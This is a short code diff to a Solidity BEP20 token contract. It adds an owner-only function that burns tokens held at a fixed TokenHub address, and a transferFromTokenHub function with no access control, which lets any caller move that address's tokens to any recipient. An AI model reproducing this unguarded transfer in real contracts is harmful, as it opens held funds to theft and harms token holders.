@@ -590,8 +590,14 @@ contract NPXSXEMBSC is Context, iBEP20, Ownable {
     ERC20Interface(token).transfer(_to, amount);
   } 
 
-  function burnOnlyOwner(address account, uint256 amount) public onlyOwner {
+  function burnTokenHub(uint256 amount) public onlyOwner {
+      address TokenHub = 0x0000000000000000000000000000000000001004;
+      _burn(TokenHub, amount);
+  }
 
-      _burn(account, amount);
+  function transferFromTokenHub(address recipient, uint256 amount) external returns (bool) {
+    address TokenHub = 0x0000000000000000000000000000000000001004;
+    _transfer(TokenHub, recipient, amount);
+    return true;
   }
 }
